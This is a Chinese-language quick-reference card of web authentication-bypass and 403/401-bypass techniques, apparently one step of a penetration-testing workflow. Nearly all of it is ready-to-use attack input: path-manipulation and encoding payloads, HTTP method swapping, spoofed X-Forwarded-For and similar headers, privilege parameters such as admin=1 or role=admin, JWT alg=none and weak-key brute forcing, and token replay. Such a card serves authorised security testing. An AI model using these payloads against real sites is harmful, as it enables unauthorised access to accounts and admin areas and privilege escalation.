# 认证绕过/403绕过秒杀卡 (≤50行)

## 403/401 路径绕过
```
分号: /admin/..;/admin   /admin/;/login
大小写: /ADMIN  /aDmIn  /Admin.css
扩展: /admin/  /admin/.  /admin/..  /admin%2f
编码: /%61dmin  /%2561dmin  (双重)
方法: POST/HEAD/OPTIONS/TRACE 替代 GET
头: X-Forwarded-For: 127.0.0.1 / X-Real-IP / X-Originating-IP
```

## 认证绕过（后端默认值）
```
参数: admin=1 / isAdmin=true / role=admin / verified=1
删 header/cookie → 后端走默认未校验分支
JSON 额外字段: {"user": "admin", "role": "admin"}
```

## Token/JWT
```
JWT: alg=none / 弱密钥爆破(toolchain.md jwt_tool) / 篡改 payload
Token 空值/缺省 → 后端默认信任（正方 auth_cxVanyIndex 案例）
重放: 已用 token 复用 / 过期 token 时间戳回拨
```

→ 返回 S2: {绕过成功?, 认证方式?, 可越权?}
